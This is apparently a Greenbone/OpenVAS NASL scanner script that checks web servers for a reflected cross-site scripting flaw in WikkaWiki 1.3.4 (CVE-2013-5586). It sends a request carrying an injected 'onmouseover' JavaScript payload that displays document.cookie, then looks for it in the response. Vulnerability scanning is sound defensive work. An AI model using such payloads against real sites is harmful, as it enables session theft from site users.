# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803892");
  script_version("2024-05-30T05:05:32+0000");
  script_tag(name:"last_modification", value:"2024-05-30 05:05:32 +0000 (Thu, 30 May 2024)");
  script_tag(name:"creation_date", value:"2013-09-16 15:14:50 +0530 (Mon, 16 Sep 2013)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2013-5586");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("WikkaWiki <= 1.3.4 XSS Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"WikkaWiki is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed via 'wakka' parameter to 'wikka.php' script is not
  properly sanitised before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WikkaWiki version 1.3.4 and probably prior.");

  script_tag(name:"solution", value:"Update to version 1.3.4-p1 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/54790");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62325");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Sep/47");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23170");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

foreach dir (make_list_unique("/", "/wikka", "/wiki", "/wikkawiki", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  url = dir + "/HomePage";

  if (http_vuln_check(port: port, url: url, check_header: TRUE, usecache: TRUE, pattern: "WikkaWiki<")) {
    url = dir + '/"onmouseover="javascript:alert(document.cookie)';

    if (http_vuln_check(port: port, url: url, check_header: TRUE,
                        pattern: "onmouseover=.javascript:alert\(document\.cookie\)",
                        extra_check: make_list(">Powered by WikkaWiki<"))) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
